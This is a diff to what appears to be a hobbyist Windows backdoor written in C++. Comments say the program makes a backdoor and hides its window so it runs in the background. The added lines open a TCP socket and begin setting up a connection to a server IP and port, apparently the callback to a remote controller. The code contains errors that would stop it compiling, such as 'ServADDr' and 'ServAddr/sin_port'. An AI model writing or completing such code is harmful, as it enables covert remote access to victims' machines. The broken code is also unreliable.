@@ -5,6 +5,8 @@
 #include<wininet.h>
 #include<string.h>
 #include<sys/types.h>
+
+int sock; 
 // program for making backdoor in the window operating system 
 using namespace std;
 // function for hiding the window for instance to run in backgroud 
@@ -28,6 +30,13 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev,LPSTR lpCndLine, int n
         
         exit(1);        
         }
+        
+        sock = socket(AF_INET, SOCK_STREAM,0); 
+        // memset function set all bit with zero 
+        memset(&ServAddr,0 , sizeof(ServAddr));
+        ServADDr.sin_family= AF_INET;
+        ServAddr.sin_addr= inet_addr(ServIP);
+        ServAddr/sin_port=htons(ServPort);
 }
 
 int main (){
